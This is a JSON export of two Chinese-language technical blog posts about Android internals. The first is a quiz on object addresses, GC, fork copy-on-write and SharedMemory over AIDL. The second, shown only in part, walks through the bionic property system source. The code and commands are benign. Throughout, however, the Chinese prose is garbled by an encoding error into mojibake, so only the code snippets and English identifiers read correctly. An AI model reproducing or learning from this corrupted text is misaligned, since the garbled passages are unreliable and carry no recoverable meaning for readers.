å¼€å‘è€…çš„ç³»ç»ŸåŸºç¡€çŸ¥è¯†ç§‘æ™®","slug":"system-foundation-for-android-devs","date":"2023-03-28T08:03:06.000Z","updated":"2025-04-24T10:33:02.825Z","comments":true,"path":"2023/03/28/system-foundation-for-android-devs/","link":"","permalink":"https://blog.canyie.top/2023/03/28/system-foundation-for-android-devs/","excerpt":"ä¸æˆ‘ä»¥å¾€çš„é£æ ¼ä¸åŒï¼Œæœ¬æ–‡ä¸ºç§‘æ™®ç±»æ–‡ç« ï¼Œå› æ­¤ä¸ä¼šæ¶‰åŠåˆ°å¤ªè¿‡é«˜æ·±éš¾æ‡‚çš„çŸ¥è¯†ã€‚ä½†è¿™äº›å†…å®¹å¯èƒ½ Android åº”ç”¨å±‚å¼€å‘è€…ç”šè‡³éƒ¨åˆ† framework å±‚å¼€å‘è€…éƒ½ä¸äº†è§£ï¼Œå› æ­¤ä»æ—§é«˜èƒ½é¢„è­¦ã€‚å¦å¤–å¹¿ä¸œè¿™ä¸¤å¤©å¥½å†·å•Šï¼Œå¤§å®¶æ³¨æ„ä¿æš–~","text":"ä¸æˆ‘ä»¥å¾€çš„é£æ ¼ä¸åŒï¼Œæœ¬æ–‡ä¸ºç§‘æ™®ç±»æ–‡ç« ï¼Œå› æ­¤ä¸ä¼šæ¶‰åŠåˆ°å¤ªè¿‡é«˜æ·±éš¾æ‡‚çš„çŸ¥è¯†ã€‚ä½†è¿™äº›å†…å®¹å¯èƒ½ Android åº”ç”¨å±‚å¼€å‘è€…ç”šè‡³éƒ¨åˆ† framework å±‚å¼€å‘è€…éƒ½ä¸äº†è§£ï¼Œå› æ­¤ä»æ—§é«˜èƒ½é¢„è­¦ã€‚å¦å¤–å¹¿ä¸œè¿™ä¸¤å¤©å¥½å†·å•Šï¼Œå¤§å®¶æ³¨æ„ä¿æš–~è™šæ‹Ÿæœºä¸è¿è¡Œæ—¶å¯¹è±¡çš„æ¦‚å¿µå‡è®¾ getObjectAddress(Object) æ˜¯ä¸€ä¸ªè·å–å¯¹è±¡å†…å­˜åœ°å€çš„æ–¹æ³•ã€‚ç¬¬ä¸€é¢˜ï¼šè€ƒè™‘å¦‚ä¸‹ä»£ç ï¼š123456public static void main(String[] args) &#123; Object o = new Object(); long address1 = getObjectAddress(o); // ....... long address2 = getObjectAddress(o);&#125;main æ–¹æ³•ä¸­ï¼Œåˆ›å»ºäº†ä¸€ä¸ª Object å¯¹è±¡ï¼Œéšåä¸¤æ¬¡è°ƒç”¨ getObjectAddress è·å–è¯¥å¯¹è±¡çš„åœ°å€ã€‚ä¸¤æ¬¡è·å–åˆ°çš„å¯¹è±¡åœ°å€æ˜¯å¦æœ‰å¯èƒ½ä¸åŒï¼Ÿæ¢å¥è¯è¯´ï¼Œå¯¹è±¡çš„åœ°å€æ˜¯å¦æœ‰å¯èƒ½å˜æ›´ï¼Ÿç­”ï¼šæœ‰å¯èƒ½ã€‚JVM ä¸­å­˜åœ¨ GC å³â€œåƒåœ¾å›æ”¶â€æœºåˆ¶ï¼Œä¼šå›æ”¶ä¸å†ä½¿ç”¨çš„å¯¹è±¡ä»¥è…¾å‡ºå†…å­˜ç©ºé—´ã€‚GC å¯èƒ½ä¼šç§»åŠ¨å¯¹è±¡ã€‚ç¬¬äºŒé¢˜ï¼šè€ƒè™‘å¦‚ä¸‹ä»£ç ï¼š12345678910private static long allocate() &#123; Object o = new Object(); return getObjectAddress(o);&#125;public static void main(String[] args) &#123; long address1 = allocate(); // ...... long address2 = allocate();&#125;allocate() åˆ›å»ºäº†ä¸€ä¸ª Object å¯¹è±¡ï¼Œç„¶åè·å–å®ƒçš„å¯¹è±¡åœ°å€ã€‚main æ–¹æ³•ä¸­è°ƒç”¨ä¸¤æ¬¡ allocate()ï¼Œè¿™ä¸¤ä¸ªå¯¹è±¡çš„å†…å­˜åœ°å€æ˜¯å¦æœ‰å¯èƒ½ç›¸åŒï¼Ÿç­”ï¼šæœ‰å¯èƒ½ã€‚åœ¨ allocate() æ–¹æ³•ä¸­åˆ›å»ºçš„å¯¹è±¡åœ¨è¯¥æ–¹æ³•è¿”å›åä¾¿å¤±å»æ‰€æœ‰å¼•ç”¨æˆä¸ºâ€œä¸å†éœ€è¦çš„å¯¹è±¡â€ï¼Œå¦‚æœä¸¤æ¬¡æ–¹æ³•è°ƒç”¨ä¹‹é—´ï¼Œç¬¬ä¸€æ¬¡æ–¹æ³•è°ƒç”¨ä¸­äº§ç”Ÿçš„ä¸´æ—¶å¯¹è±¡è¢«ä¸Šæ–‡ä¸­æåˆ°çš„ GC æœºåˆ¶å›æ”¶ï¼Œå¯¹åº”çš„å†…å­˜ç©ºé—´å°±å˜å¾—â€œç©ºé—²â€ï¼Œå¯ä»¥è¢«å…¶ä»–å¯¹è±¡å ç”¨ã€‚ç¬¬ä¸‰é¢˜ï¼šå“å‘€ï¼Œæ—¢ç„¶ä¸Šé¢è¯´åŒä¸€ä¸ªå¯¹è±¡çš„å†…å­˜åœ°å€å¯èƒ½ä¸ç›¸åŒï¼Œä¸¤ä¸ªä¸åŒå¯¹è±¡ä¹Ÿæœ‰å¯èƒ½æœ‰ç›¸åŒçš„å†…å­˜åœ°å€ï¼Œè€Œjava é‡Œçš„ == åˆæ˜¯åˆ¤æ–­å¯¹è±¡çš„å†…å­˜åœ°å€ï¼Œé‚£ä¹ˆ12Object o = new Object();if (o != o)è¿˜æœ‰123Object o1 = new Object();Object o2 = new Object();if (o1 == o2)è¿™é‡Œçš„ä¸¤ä¸ª if ä¸æ˜¯éƒ½æœ‰å¯èƒ½æˆç«‹ï¼Ÿç­”ï¼šä¸å¯èƒ½ã€‚== æ“ä½œç¬¦æ¯”è¾ƒçš„ç¡®å®æ˜¯å¯¹è±¡åœ°å€æ²¡é”™ï¼Œä½†æ˜¯è¿™é‡Œå…¶å®è¿˜éšå«äº†ä¸¤ä¸ªæ¡ä»¶ï¼šè¿™ä¸ªæ“ä½œç¬¦æ¯”è¾ƒçš„æ˜¯ â€œé‚£ä¸€åˆ»â€ ä¸¤ä¸ªå¯¹è±¡çš„åœ°å€ã€‚æ¯”è¾ƒçš„ä¸¤ä¸ªå¯¹è±¡éƒ½ä½äºåŒä¸€ä¸ªè¿›ç¨‹å†…ã€‚ä¸Šè¿°æåˆ°çš„ä¸¤ç§æƒ…å†µéƒ½ä¸æ»¡è¶³â€œåŒä¸€æ—¶é—´â€è¿™ä¸€æ¡ä»¶ï¼Œå› æ­¤è¿™ä¸¤æ¡ if æ°¸è¿œä¸ä¼šæˆç«‹ã€‚ç±»ä¸æ–¹æ³•ç¬¬å››é¢˜ï¼šå‡è®¾ Framework æ˜¯ Android Framework é‡Œçš„ä¸€ä¸ªç±»ï¼ŒApp æ˜¯æŸä¸ª Android App çš„ä¸€ä¸ªç±»ï¼š1234567891011public class Framework &#123; public static int api() &#123; return 0; &#125;&#125;public class App &#123; public static void main(String[] args) &#123; Framework.api(); &#125;&#125;ç¼–è¯‘ Appï¼Œç„¶åå°† Framework å†… api æ–¹æ³•çš„è¿”å›å€¼ç±»å‹ä» int æ”¹ä¸º longï¼Œç¼–è¯‘ Framework ä½†ä¸é‡æ–°ç¼–è¯‘ Appï¼ŒApp æ˜¯å¦å¯ä»¥æ­£å¸¸è°ƒç”¨ Framework çš„ api æ–¹æ³•ï¼Ÿç­”ï¼šä¸èƒ½ã€‚Java ç±»å†…å­˜å‚¨çš„è¢«è°ƒç”¨æ–¹æ³•çš„ä¿¡æ¯é‡ŒåŒ…å«è¿”å›å€¼ç±»å‹ï¼Œå¦‚æœè¿”å›å€¼ç±»å‹ä¸å¯¹åœ¨è¿è¡Œæ—¶å°±æ‰¾ä¸åˆ°å¯¹åº”æ–¹æ³•ã€‚å°†æ–¹æ³•æ”¹ä¸ºæˆå‘˜å˜é‡ç„¶åä¿®æ”¹è¯¥å˜é‡çš„ç±»å‹ä¹ŸåŒç†ã€‚ç¬¬äº”é¢˜ï¼šè€ƒè™‘å¦‚ä¸‹ä»£ç ï¼š12345678910111213141516class Parent &#123; public void call() &#123; privateMethod(); &#125; private void privateMethod() &#123; System.out.println(\"Parent method called\"); &#125;&#125;class Child extends Parent &#123; private void privateMethod() &#123; System.out.println(\"Child method called\"); &#125;&#125;new Child().call();Child é‡Œçš„ privateMethod æ˜¯å¦é‡å†™äº† Parent é‡Œçš„ï¼Ÿcall ä¸­è°ƒç”¨çš„ privateMethod() ä¼šè°ƒç”¨åˆ° Parent é‡Œçš„è¿˜æ˜¯ Child é‡Œçš„ï¼Ÿç­”ï¼šä¸æ„æˆæ–¹æ³•é‡å†™ï¼Œè¿˜æ˜¯ä¼šè°ƒç”¨åˆ° Parent é‡Œçš„ privateMethodã€‚private æ–¹æ³•æ˜¯ direct æ–¹æ³•ï¼Œdirect æ–¹æ³•æ— æ³•è¢«é‡å†™ã€‚æ“ä½œç³»ç»ŸåŸºç¡€å¤šè¿›ç¨‹ä¸è™šæ‹Ÿå†…å­˜å‡è®¾æœ‰è¿›ç¨‹ A å’Œè¿›ç¨‹ Bã€‚ç¬¬å…­é¢˜ï¼šè¿›ç¨‹ A é‡Œçš„å¯¹è±¡ a å’Œè¿›ç¨‹ B é‡Œçš„å¯¹è±¡ b æ‹¥æœ‰ç›¸åŒçš„å†…å­˜åœ°å€ï¼Œå®ƒä»¬æ˜¯åŒä¸€ä¸ªå¯¹è±¡å—ï¼Ÿç­”ï¼šå½“ç„¶ä¸æ˜¯ï¼Œä¸Šé¢æ‰è¯´è¿‡â€œå¯¹è±¡ç›¸ç­‰â€è¿™ä¸ªæ¦‚å¿µåœ¨åŒä¸€ä¸ªè¿›ç¨‹é‡Œæ‰æœ‰æ„ä¹‰ï¼Œä¸è®¤çœŸå¬è¯¾æ€è€ƒæ˜¯ä¼šè¢«æ‰“å±å±çš„~ç¬¬ä¸ƒé¢˜ï¼šè¿›ç¨‹ A å†…æœ‰ä¸€ä¸ªå¯¹è±¡ a å¹¶å°†è¿™ä¸ªå¯¹è±¡çš„å†…å­˜åœ°å€ä¼ é€’ç»™äº† Bï¼ŒB æ˜¯å¦å¯ä»¥ç›´æ¥è®¿é—®ï¼ˆè¯»å–ã€å†™å…¥ç­‰æ“ä½œï¼‰è¿™ä¸ªå¯¹è±¡ï¼Ÿç­”ï¼šä¸èƒ½ï¼Œå¤§æ¦‚ç‡ä¼šè§¦å‘æ®µé”™è¯¯ï¼Œå°æ¦‚ç‡ä¼šä¿®æ”¹åˆ°è‡ªå·±å†…å­˜ç©ºé—´é‡ŒæŸä¸ªå†¤ç§å¯¹è±¡çš„æ•°æ®ï¼Œæ— è®ºå¦‚ä½•éƒ½ä¸ä¼šå½±å“åˆ°è¿›ç¨‹ Aã€‚ä½œä¸ºåœ¨ç”¨æˆ·ç©ºé—´è¿è¡Œçš„è¿›ç¨‹ï¼Œå®ƒä»¬æ‹¿åˆ°çš„æ‰€è°“å†…å­˜åœ°å€å…¨éƒ¨éƒ½æ˜¯è™šæ‹Ÿåœ°å€ï¼Œè¿›ç¨‹è®¿é—®è¿™äº›åœ°å€çš„æ—¶å€™ä¼šå…ˆç»è¿‡ä¸€ä¸ªè½¬æ¢è¿‡ç¨‹è½¬åŒ–ä¸ºç‰©ç†åœ°å€å†æ“ä½œã€‚å¦‚æœè½¬æ¢å‡ºé”™ï¼ˆäººå®¶æ ¹æœ¬ä¸è®¤è¯†ä½ ç»™çš„è¿™ä¸ªåœ°å€ï¼Œæˆ–è€…å¯¹åº”å†…å­˜çš„æƒé™ä¸è®©ä½ æ‰§è¡Œå¯¹åº”æ“ä½œï¼‰ï¼Œå°±ä¼šè§¦å‘æ®µé”™è¯¯ã€‚ç¬¬å…«é¢˜ï¼šè¿˜æ˜¯æˆ‘ä»¬å¯çˆ±çš„è¿›ç¨‹ A å’Œ Bï¼Œä½†æ˜¯è¿™æ¬¡ B æ˜¯ A çš„å­è¿›ç¨‹ï¼Œå³ A è°ƒç”¨ fork äº§ç”Ÿäº† B è¿™ä¸ªæ–°çš„è¿›ç¨‹ï¼š1234567891011void a() &#123; int* p = malloc(sizeof(int)); *p = 1; if (fork() &gt; 0) &#123; // è¿›ç¨‹ A ä¹Ÿå³çˆ¶è¿›ç¨‹ // å·´æ‹‰å·´æ‹‰å·´æ‹‰ä¸€å †æ“ä½œ &#125; else &#123; // è¿›ç¨‹ B ä¹Ÿå³å­è¿›ç¨‹ *p = 2; &#125;&#125;ï¼ˆfork æ˜¯ Posix å†…åˆ›å»ºè¿›ç¨‹çš„ APIï¼Œè°ƒç”¨å®Œæˆåå¦‚æœä»ç„¶åœ¨çˆ¶è¿›ç¨‹åˆ™è¿”å›å­è¿›ç¨‹çš„ pid æ°¸è¿œå¤§äº 0ï¼Œåœ¨å­è¿›ç¨‹åˆ™è¿”å› 0ï¼‰ï¼ˆè¿˜æ˜¯ç†è§£ä¸äº†å°±æŠŠ A æƒ³è±¡ä¸º Zygote è¿›ç¨‹ï¼ŒB æƒ³è±¡ä¸ºä»»æ„ App è¿›ç¨‹ï¼‰è¿™ä¸€æ®µä»£ç åˆ†é…äº†ä¸€æ®µå†…å­˜ï¼Œè°ƒç”¨ fork äº§ç”Ÿäº†ä¸€ä¸ªå­è¿›ç¨‹ï¼Œç„¶ååœ¨å­è¿›ç¨‹é‡Œå°†é¢„å…ˆåˆ†é…å¥½çš„é‚£æ®µå†…å­˜é‡Œçš„å€¼æ›´æ”¹ä¸º 2ã€‚é—®ï¼šè¿›ç¨‹ B åšå‡ºçš„æ›´æ”¹æ˜¯å¦å¯¹è¿›ç¨‹ A å¯è§ï¼Ÿç­”ï¼šä¸å¯è§ï¼Œè¿›ç¨‹ A çœ‹è§çš„é‚£ä¸€æ®µå†…å­˜çš„å€¼ä¾ç„¶æ˜¯ 1ã€‚Linux å†…æ ¸æœ‰ä¸€ä¸ªå«åšâ€œå†™æ—¶å¤åˆ¶â€ï¼ˆCopy On Writeï¼‰çš„æŠ€æœ¯ï¼Œåœ¨è¿›ç¨‹ B å°è¯•å†™å…¥è¿™ä¸€æ®µå†…å­˜çš„æ—¶å€™ä¼šå·å·æŠŠçœŸå®çš„å†…å­˜ç»™å¤åˆ¶ä¸€ä»½ï¼Œæœ€åå†™å…¥çš„æ˜¯è¿™ä»½æ‹·è´é‡Œçš„å€¼ï¼Œè€Œè¿›ç¨‹ A çœ‹è§çš„è¿˜æ˜¯åŸæ¥çš„å€¼ã€‚è·¨è¿›ç¨‹å¤§æ•°æ®ä¼ é€’å·²çŸ¥è¿›ç¨‹ A å’Œè¿›ç¨‹ Bï¼Œè¿›ç¨‹ A æš´éœ²å‡ºä¸€ä¸ª AIDL æ¥å£ï¼Œç°åœ¨è¿›ç¨‹ B è¦ä» A è·å– 10M çš„æ•°æ®ï¼ˆè¿œè¿œè¶…å‡º binder æ•°æ®å¤§å°é™åˆ¶ï¼‰ï¼Œä¸”ç¦æ­¢ä¼ é€’æ–‡ä»¶è·¯å¾„ï¼Œåªå…è®¸è°ƒç”¨è¿™ä¸ª AIDL æ¥å£ä¸€æ¬¡ï¼Œè¯·é—®å¦‚ä½•å®ç°ï¼Ÿç­”ï¼šå¯ä»¥ä¼ é€’æ–‡ä»¶æè¿°ç¬¦ï¼ˆFile Descriptorï¼‰ã€‚åˆ«ä»¥ä¸ºè¿™ä¸ªç©æ„åªèƒ½è¡¨ç¤ºæ–‡ä»¶ï¼ä¸¾ä¸ªä¾‹å­ï¼Œä½œä¸ºåº”ç”¨å±‚å¼€å‘è€…æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…±äº«å†…å­˜çš„æ–¹æ³•ï¼Œè¿™æ ·ç¼–å†™ AIDL å®ç°ç±»æŠŠæ•°æ®ä¼ é€’å‡ºå»ï¼š12345678910111213141516171819202122@Override public SharedMemory getData() throws RemoteException &#123; int size = 10 * 1024 * 1024; try &#123; SharedMemory sharedMemory = SharedMemory.create(\"shared memory\", size); ByteBuffer buffer = sharedMemory.mapReadWrite(); for (int i = 0;i &lt; 10;i++) &#123; // æ¨¡æ‹Ÿäº§ç”Ÿä¸€å †æ•°æ® buffer.put(i * 1024 * 1024, (byte) 114); buffer.put(i * 1024 * 1024 + 1, (byte) 51); buffer.put(i * 1024 * 1024 + 2, (byte) 4); buffer.put(i * 1024 * 1024 + 3, (byte) 191); buffer.put(i * 1024 * 1024 + 4, (byte) 98); buffer.put(i * 1024 * 1024 + 5, (byte) 108); buffer.put(i * 1024 * 1024 + 6, (byte) 93); &#125; SharedMemory.unmap(buffer); sharedMemory.setProtect(OsConstants.PROT_READ); return sharedMemory; &#125; catch (ErrnoException e) &#123; throw new RemoteException(\"remote create shared memory failed: \" + e.getMessage()); &#125;&#125;ç„¶ååœ¨è¿›ç¨‹ B é‡Œè¿™æ ·æ‹¿ï¼š123456789101112131415161718IRemoteService service = IRemoteService.Stub.asInterface(binder);try &#123; SharedMemory sharedMemory = service.getData(); ByteBuffer buffer = sharedMemory.mapReadOnly(); // æ¨¡æ‹Ÿå¤„ç†æ•°æ® int[] temp = new int[10]; for (int i = 0;i &lt; 10;i++) &#123; for (int j = 0;j &lt; 10;j++) &#123; temp[j] = buffer.get(i * 1024 * 1024 + j); &#125; Log.e(TAG, \"Large buffer[\" + i + \"]=\" + Arrays.toString(temp)); &#125; SharedMemory.unmap(buffer); sharedMemory.close();&#125; catch (Exception e) &#123; throw new RuntimeException(e);&#125;è¿™é‡Œä½¿ç”¨çš„ SharedMemory ä» Android 8.1 å¼€å§‹å¯ç”¨ï¼Œåœ¨ 8.1 ä¹‹å‰çš„ç³»ç»Ÿé‡Œä¹Ÿæœ‰ä¸€ä¸ªå«åš MemoryFile çš„ API å¯ä»¥ç”¨ã€‚æ‰“å¼€ SharedMemory é‡Œçš„æºç ï¼Œä½ ä¼šå‘ç°å…¶å®å®ƒå†…éƒ¨å°±æ˜¯åˆ›å»ºäº†ä¸€å— ashmem ï¼ˆåŒ¿åå…±äº«å†…å­˜ï¼‰ï¼Œç„¶åå°†å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦ä¼ é€’ç»™ binderã€‚å†…æ ¸ä¼šè´Ÿè´£å°†ä¸€ä¸ªå¯ç”¨çš„æ–‡ä»¶æè¿°ç¬¦ä¼ é€’ç»™ç›®æ ‡è¿›ç¨‹ã€‚ä½ å¯ä»¥å°†å®ƒç†è§£ä¸ºå¯ä»¥è·¨è¿›ç¨‹ä¼ é€’çš„ File Streamï¼ˆåªè¦èƒ½é€šè¿‡æƒé™æ£€æŸ¥ï¼‰ï¼Œåˆç†åˆ©ç”¨è¿™ä¸ªå°ç©æ„æœ‰å¥‡æ•ˆå“¦ ï¼šï¼‰","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"system","slug":"system","permalink":"https://blog.canyie.top/tags/system/"},{"name":"art","slug":"art","permalink":"https://blog.canyie.top/tags/art/"},{"name":"kernel","slug":"kernel","permalink":"https://blog.canyie.top/tags/kernel/"}]},{"title":"Android Property å®ç°è§£æä¸é»‘é­”æ³•","slug":"property-implementation-and-isolation","date":"2022-04-09T09:30:00.000Z","updated":"2025-04-24T10:33:02.823Z","comments":true,"path":"2022/04/09/property-implementation-and-isolation/","link":"","permalink":"https://blog.canyie.top/2022/04/09/property-implementation-and-isolation/","excerpt":"Android Property ï¼ˆå±æ€§ç³»ç»Ÿï¼‰å¯è°“æ˜¯ Android ä¸­ä½¿ç”¨æœ€å¹¿æ³›çš„è¿›ç¨‹é—´ä¿¡æ¯å…±äº«æœºåˆ¶äº†ï¼Œå¦‚ app è·å–ç³»ç»Ÿç‰ˆæœ¬å·ï¼Œå°±æ˜¯é€šè¿‡å±æ€§ç³»ç»Ÿä¼ é€’çš„ä¿¡æ¯ï¼›å¯¹äºå¦‚æ­¤å¸¸ç”¨çš„åº•å±‚æœºåˆ¶ï¼Œä½ å¯èƒ½çŸ¥é“ getprop SystemProperties __system_property_get è¿™äº› APIï¼Œä½†æ˜¯ï¼Œä½ çœŸçš„äº†è§£å®ƒå—ï¼Ÿè¿™æ¬¡ï¼Œæˆ‘ä»¬ä¸ä½†è¦ä¼šéµå®ˆè§„åˆ™ç”¨è¿™äº› APIï¼Œæˆ‘ä»¬è¿˜è¦æˆä¸ºè§„åˆ™çš„ç¼”é€ è€…ï¼Œè®©ç³»ç»Ÿä¸ºæˆ‘ä»¬æœåŠ¡ï¼Letâ€™s goï¼","text":"Android Property ï¼ˆå±æ€§ç³»ç»Ÿï¼‰å¯è°“æ˜¯ Android ä¸­ä½¿ç”¨æœ€å¹¿æ³›çš„è¿›ç¨‹é—´ä¿¡æ¯å…±äº«æœºåˆ¶äº†ï¼Œå¦‚ app è·å–ç³»ç»Ÿç‰ˆæœ¬å·ï¼Œå°±æ˜¯é€šè¿‡å±æ€§ç³»ç»Ÿä¼ é€’çš„ä¿¡æ¯ï¼›å¯¹äºå¦‚æ­¤å¸¸ç”¨çš„åº•å±‚æœºåˆ¶ï¼Œä½ å¯èƒ½çŸ¥é“ getprop SystemProperties __system_property_get è¿™äº› APIï¼Œä½†æ˜¯ï¼Œä½ çœŸçš„äº†è§£å®ƒå—ï¼Ÿè¿™æ¬¡ï¼Œæˆ‘ä»¬ä¸ä½†è¦ä¼šéµå®ˆè§„åˆ™ç”¨è¿™äº› APIï¼Œæˆ‘ä»¬è¿˜è¦æˆä¸ºè§„åˆ™çš„ç¼”é€ è€…ï¼Œè®©ç³»ç»Ÿä¸ºæˆ‘ä»¬æœåŠ¡ï¼Letâ€™s goï¼ç³»ç»Ÿå®ç°åˆ†æé¦–å…ˆï¼Œæˆ‘ä»¬æœ‰è¿™å‡ ä¸ªé—®é¢˜éœ€è¦è§£ç­”ï¼šro. å¼€å¤´çš„å±æ€§æ˜¯åªè¯»çš„ï¼Œåªèƒ½è¢«è®¾ç½®ä¸€æ¬¡ï¼Œç³»ç»Ÿæ˜¯æ€ä¹ˆå®ç°çš„ï¼Ÿç³»ç»Ÿé‡Œçš„å±æ€§é‚£ä¹ˆå¤šï¼Œéš¾å…ä¼šæœ‰ä¸€äº› app è¯»å–ä¸äº†çš„æ•æ„Ÿå±æ€§ï¼Œç³»ç»Ÿæ˜¯æ€ä¹ˆé™åˆ¶æˆ‘ä»¬è¯»å–çš„ï¼ŸLinus å¤§ç¥æœ‰å¥è¯å¾ˆå‡ºåï¼šâ€œRead the F*cking Source Codeã€‚â€æƒ³è¦è§£ç­”è¿™äº›é—®é¢˜ï¼Œé˜…è¯»æºç æ˜¯å¿…é¡»çš„ã€‚Property Contextæˆ‘ä»¬é€šå¸¸ä½¿ç”¨ __system_properties_get è¿™ä¸ª API å»è·å–ç³»ç»Ÿå±æ€§ï¼Œç‚¹å¼€è¿™ä¸ªå‡½æ•°çœ‹çœ‹ï¼š12345678910111213141516static SystemProperties system_properties;__BIONIC_WEAK_FOR_NATIVE_BRIDGEint __system_property_get(const char* name, char* value) &#123; return system_properties.Get(name, value);&#125;int SystemProperties::Get(const char* name, char* value) &#123; const prop_info* pi = Find(name); if (pi != nullptr) &#123; return Read(pi, nullptr, value); &#125; else &#123; value[0] = 0; return 0; &#125;&#125;å…ˆå»è°ƒç”¨ Find() å‡½æ•°æ‰¾åˆ°ä¸€ä¸ªå«åš prop_info* çš„ä¸œè¥¿ï¼Œç„¶åä»é‡Œé¢è¯»å‡ºå€¼æ¥ã€‚1234567891011const prop_info* SystemProperties::Find(const char* name) &#123; if (!initialized_) &#123; return nullptr; &#125; prop_area* pa = contexts_-&gt;GetPropAreaForName(name); if (!pa) &#123; async_safe_format_log(ANDROID_LOG_WARN, \"libc\", \"Access denied finding property \\\"%s\\\"\", name); return nullptr; &#125; return pa-&gt;find(name);&#125;çœ‹åˆ°è¿™é‡Œä½ æ˜¯ä¸æ˜¯ä¸€å¤´é›¾æ°´ï¼Œè¿™å‡½æ•°æœ‰ä¸ª initialized_ ä¸€çœ‹å°±æ˜¯è¦åˆå§‹åŒ–çš„ï¼Œè°å»åˆå§‹åŒ–çš„ï¼Ÿcontexts_ prop_area åˆæ˜¯ä»€ä¹ˆï¼Ÿè¿™é‡Œå°±ä¸å–å…³å­äº†ï¼Œåœ¨ libc.so è¢«åŠ è½½çš„æ—¶å€™ï¼Œå®ƒçš„ .init.array æ®µé‡Œé¢çš„å‡½æ•°ä¼šè¢«è‡ªåŠ¨æ‰§è¡Œï¼Œè€Œæœ‰ __attribute__((constructor(1)) çš„å‡½æ•°å°±ä¼šè¢«æ”¾åˆ° .init.array æ®µä»è€Œè¢«è‡ªåŠ¨æ‰§è¡Œã€‚é‡Œé¢å…œå…œè½¬è½¬ï¼Œä¼šè°ƒç”¨ä¸€ä¸ª __system_properties_init() å‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°æ­£æ˜¯åˆå§‹åŒ–ä¸Šé¢è¿™äº›ä¸œè¥¿çš„å…³é”®æ‰€åœ¨ã€‚123456789101112131415161718192021222324252627282930#define PROP_FILENAME \"/dev/__properties__\"int __system_properties_init() &#123; return system_properties.Init(PROP_FILENAME) ? 0 : -1;&#125;bool SystemProperties::Init(const char* filename) &#123; // This is called from __libc_init_common, and should leave errno at 0 (http://b/37248982). // ... strcpy(property_filename_, filename); if (is_dir(property_filename_)) &#123; if (access(\"/dev/__properties__/property_info\", R_OK) == 0) &#123; contexts_ = new (contexts_data_) ContextsSerialized(); if (!contexts_-&gt;Initialize(false, property_filename_, nullptr)) &#123; return false; &#125; &#125; else &#123; contexts_ = new (contexts_data_) ContextsSplit(); if (!contexts_-&gt;Initialize(false, property_filename_, nullptr)) &#123; return false; &#125; &#125; &#125; else &#123; contexts_ = new (contexts_data_) ContextsPreSplit(); if (!contexts_-&gt;Initialize(false, property_filename_, nullptr)) &#123; return false; &#125; &#125; initialized_ = true; return true;&#125;åè¯è¶Šæ¥è¶Šå¤šäº†â€¦â€¦å…ˆåˆ«æ€¥ç€å¤´æ™•ï¼Œèªæ˜çš„ä½ è‚¯å®šå‘ç°ï¼Œè¿™é‡Œå‡ºç°äº†ä¸¤ä¸ªæ–‡ä»¶è·¯å¾„ï¼š/dev/__properties__ å’Œ /dev/__properties__/property_infoã€‚è¿ä¸Šæ‰‹æœº ls ä¸€ä¸‹çœ‹çœ‹ï¼š12345678vince:&#x2F; # ls -lZ &#x2F;dev&#x2F;__properties__total 1376-r--r--r-- 1 root root u:object_r:properties_serial:s0 131072 1970-07-08 15:56 properties_serial-r--r--r-- 1 root root u:object_r:property_info:s0 62540 1970-07-08 15:56 property_info-r--r--r-- 1 root root u:object_r:aac_drc_prop:s0 131072 1970-07-08 15:56 u:object_r:aac_drc_prop:s0-r--r--r-- 1 root root u:object_r:aaudio_config_prop:s0 131072 1970-07-08 15:56 u:object_r:aaudio_config_prop:s0-r--r--r-- 1 root root u:object_r:ab_update_gki_prop:s0 131072 1970-07-08 15:56 u:object_r:ab_update_gki_prop:s0-r--r--r-- 1 root root u:object_r:adbd_config_prop:s0 131072 1970-07-08 15:56 u:object_r:adbd_config_prop:s0è€ŒæŸ¥çœ‹ /dev/__properties__/property_info è¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€å †äºŒè¿›åˆ¶æ•°æ®ã€‚ç»†å¿ƒçš„ä½ å¯èƒ½å·²ç»å‘ç°äº†æˆ‘ä»¬ä¸Šé¢çš„ u:object_r:adbd_config_prop:s0 è¿™äº›å¥‡æ€ªçš„æ–‡ä»¶åï¼ŒåŒæ—¶è¿˜æœ‰ release_or_codenameã€dex2oat-flags è¿™äº›æˆ‘ä»¬ç”¨è¿‡çš„å±æ€§çš„åå­—çš„ä¸€æ®µï¼ˆä»¥ç‚¹åˆ†å‰²ï¼‰ã€‚ç‚¹å¼€ ContextsSerialized é‡Œé¢æ˜¯ä¸€äº›å­—å…¸æ ‘ä¹‹ç±»çš„æ— è¶£çš„æ•°æ®ç»“æ„å†…å®¹ï¼›è€Œæˆ‘ä»¬è¦æ˜ç™½å®ƒä»¬çš„ä½œç”¨ï¼Œå…¶å®å¯ä»¥çœ‹çœ‹æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶æ—¶ï¼ˆå¦‚ä½ç‰ˆæœ¬ç³»ç»Ÿï¼‰ç”¨çš„ ContextsSplit çš„ä½œç”¨ï¼š1234567891011121314151617bool ContextsSplit::InitializeProperties() &#123; // Use property_contexts from /system &amp; /vendor, fall back to those from / if (access(\"/system/etc/selinux/plat_property_contexts\", R_OK) != -1) &#123; if (!InitializePropertiesFromFile(\"/system/etc/selinux/plat_property_contexts\")) &#123; return false; &#125; if (access(\"/vendor/etc/selinux/vendor_property_contexts\", R_OK) != -1) &#123; InitializePropertiesFromFile(\"/vendor/etc/selinux/vendor_property_contexts\"); &#125; else &#123; // Fallback to nonplat_* if vendor_* doesn't exist InitializePropertiesFromFile(\"/vendor/etc/selinux/nonplat_property_contexts\"); &#125; &#125; else &#123; // ... çœç•¥ å…¶ä»–æ–‡ä»¶è·¯å¾„ &#125; return true;&#125;æ‰¾ä¸€éƒ¨æ‰‹æœºï¼Œçœ‹çœ‹ /system/etc/selinux/plat_property_contexts æ˜¯ä»€ä¹ˆï¼š123456789101112131415#line 1 &quot;system&#x2F;sepolicy&#x2F;private&#x2F;property_contexts&quot;########################### property service keys##net.rmnet u:object_r:net_radio_prop:s0# ...net. u:object_r:system_prop:s0dev. u:object_r:system_prop:s0ro.runtime. u:object_r:system_prop:s0ro.runtime.firstboot u:object_r:firstboot_prop:s0hw. u:object_r:system_prop:s0ro.hw. u:object_r:system_prop:s0sys. u:object_r:system_prop:s0# ...å·¦è¾¹çš„ ro. net. å¾ˆæ˜æ˜¾æ˜¯å±æ€§çš„å‰ç¼€ï¼Œå³è¾¹çš„ u:object_r:system_prop:s0 